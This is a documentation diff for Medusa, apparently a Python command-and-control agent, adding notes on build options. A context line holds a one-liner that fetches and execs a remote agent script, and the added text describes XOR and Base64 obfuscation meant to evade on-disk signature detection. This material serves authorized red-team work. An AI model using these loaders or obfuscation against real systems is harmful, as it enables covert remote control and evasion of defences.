@@ -30,6 +30,32 @@ Or for Python 2.7:
 python -c "import urllib2;exec(urllib2.urlopen('https://[REMOTE_HOST]/medusa.py').read())" &
 ```
 
+### Build Options
+
+This section provides details of what each Medusa-specific build option provides
+
+#### Python Version
+
+Pretty self-explanatory, select which version of Python the Medusa agent should be created for. See the Development section for details of how this works under the hood.
+
+#### Output Format
+
+Mythic can provide the final agent code as a Python script, or as a Base64-encoded blob. Note that this is the last stage of the process effectively. So any XOR obfuscation, crypto library selection or Python version selection will take place before this.
+
+#### Cryptography library
+
+Medusa agents can be built using either a manual crypto implementation or using the non-default `cryptography` library. Given, the manual implementation isn't going to be as quick or efficient as the main Python library (not to mention the extra code required), `cryptography` use might be the way to go. Though do bear in mind, it is not a default library and appears to only be installed on macOS by default.
+
+{{% notice info %}}
+ Either option here won't affect the agents ability to use encrypted comms, it is purely to specify how the encrypted comms are achieved.
+{{% /notice %}}
+
+#### XOR and Base64-encode
+
+Finally, the plaintext Medusa script can be encrypted via XOR with a randomly-generated key, before being Base64 encoded. This blob is then wrapped with an unpacker and put in a `exec()` function to ultimately run the Medusa agent. This is designed to make the agent less signaturable when on-disk. See the OPSEC section for more details.
+
+
+
 ### Important Notes
 Each job is executed in a new thread. Long-running jobs can be viewed with the `jobs` command and, where a 'stop' functionality has been implemented, they can be killed with `jobkill`.
 
